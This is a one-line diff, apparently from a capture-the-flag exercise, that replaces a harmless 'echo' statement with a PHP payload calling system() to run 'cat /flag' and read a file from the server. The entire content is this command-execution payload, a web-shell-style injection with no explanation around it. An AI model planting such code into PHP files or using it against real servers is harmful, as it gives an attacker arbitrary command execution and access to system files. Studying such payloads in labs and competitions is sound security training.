@@ -1,1 +1,1 @@
-echo "test";
+<?php system("cat /flag"); ?>
